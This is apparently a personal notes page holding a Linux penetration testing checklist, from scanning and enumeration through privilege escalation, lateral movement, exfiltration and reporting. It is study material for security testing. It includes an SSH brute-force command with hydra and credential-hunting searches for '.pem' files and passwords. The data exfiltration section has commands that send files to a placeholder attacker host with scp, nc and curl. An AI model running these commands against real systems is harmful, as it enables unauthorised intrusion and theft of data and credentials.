---
layout: notes
permalink: /notes/linux/checklist/
title: Linux Penetration Testing Checklist
---

# Linux Penetration Testing Checklist

## Initial Access Phase

### Port Scanning
- [ ] Full TCP scan (nmap -p-)
- [ ] UDP scan of common ports
- [ ] Service version detection
- [ ] Script scanning of discovered services
- [ ] Stealth scan: ```nmap -sS <target>```
- [ ] Masscan: ```masscan -p0-65535 <target>```

### Service Enumeration
- [ ] HTTP/HTTPS: ```nikto -h <target>, curl <target>```
- [ ] SSH: ```hydra -l admin -P passwords.txt ssh://<target>```
- [ ] SMB: ```smbclient -L <target>, enum4linux <target>```
- [ ] RPC: ```rpcinfo -p <target>```
- [ ] Databases: ```nmap --script mysql-info <target>, psql <target>```

## Post Exploitation

### Privilege Escalation
- [ ] Check SUID binaries
- [ ] Review sudo permissions
- [ ] Inspect cron jobs
- [ ] Check for kernel exploits
- [ ] Review service configurations
- [ ] Check capabilities: ``` getcap -r / 2>/dev/null ```
- [ ] Check environment variables: ```bash env, export | grep PATH ```
- [ ] Use tools: LinPEAS: ``` ./LinPEAS.sh ```, Linux Smart Enumeration: ``` ./lse.sh ``` pspy64: ``` ./pspy64```

### Lateral Movement
- [ ] Network enumeration
- [ ] Password hunting
- [ ] SSH key discovery
- [ ] Trust relationships
- [ ] ARP table: ip neighbor
- [ ] Routing info: route -n
- [ ] DNS for pivoting: ``` cat /etc/resolv.conf, dig <domain>```

### Data Exfiltration
- [ ] Identify sensitive files
- [ ] Database dumps
- [ ] Configuration files
- [ ] User credentials
- [ ] Exfiltrate via: ``` scp <file> user@attacker:., nc -l 4444 > data.tar.gz, curl -T data.tar.gz https://attacker.com```
- [ ] Additional sensitive files: ```find / -name "*.pem" 2>/dev/null, grep -r "password" / 2>/dev/null```

## Documentation
- [ ] Screenshot evidence
- [ ] Command outputs
- [ ] Exploitation steps
- [ ] Remediation recommendations
- [ ] Use screenshot tool: ```scrot -s```
- [ ] Save outputs: ```uname -a > system_info.txt, sudo -l > sudo_perms.txt```
- [ ] Suggest fixes: ``` “Update kernel to patch DirtyPipe”, “Remove SUID from /usr/bin/find” ```